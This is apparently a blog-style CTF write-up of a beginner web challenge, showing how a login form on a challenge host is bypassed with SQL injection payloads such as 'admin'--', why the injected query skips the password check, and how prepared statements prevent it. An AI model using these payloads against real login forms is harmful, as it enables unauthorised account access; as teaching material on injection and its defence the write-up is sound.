+++
title = "CTF Challenge: Web Exploitation Basics"
date = 2025-01-15
description = "A walkthrough of a basic web exploitation challenge"
[taxonomies]
tags = ["ctf", "web-security", "sql-injection"]
+++

# CTF Challenge: Web Exploitation Basics

## Challenge Description

The challenge presented a simple login form with the following message:

> "Can you find a way to log in as admin without knowing the password?"

URL: `http://challenge.example.com:8080/login`

## Initial Reconnaissance

When visiting the login page, I found a basic HTML form:

```html
<form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

## Testing for SQL Injection

Given the nature of the challenge, I suspected SQL injection. I started with basic payloads:

### Test 1: Basic OR condition
```sql
Username: admin' OR '1'='1
Password: anything
```

This didn't work, suggesting some filtering might be in place.

### Test 2: Comment-based injection
```sql
Username: admin'--
Password: (empty)
```

Success! The application returned: "Welcome, admin!"

## Analysis

The vulnerable query was likely something like:
```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

By injecting `admin'--`, the query became:
```sql
SELECT * FROM users WHERE username='admin'-- AND password=''
```

The `--` comments out the password check, allowing us to log in as admin.

## Flag

After successful login, the flag was displayed: `flag{sql_1nj3ct10n_b4s1cs}`

## Mitigation

To prevent this vulnerability:

1. **Use prepared statements**: This is the most effective defense
```python
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

2. **Input validation**: Sanitize user inputs
3. **Least privilege**: Database users should have minimal necessary permissions

## Conclusion

This was a straightforward SQL injection challenge that demonstrates the importance of properly handling user input in web applications. Always use parameterized queries to prevent such vulnerabilities!
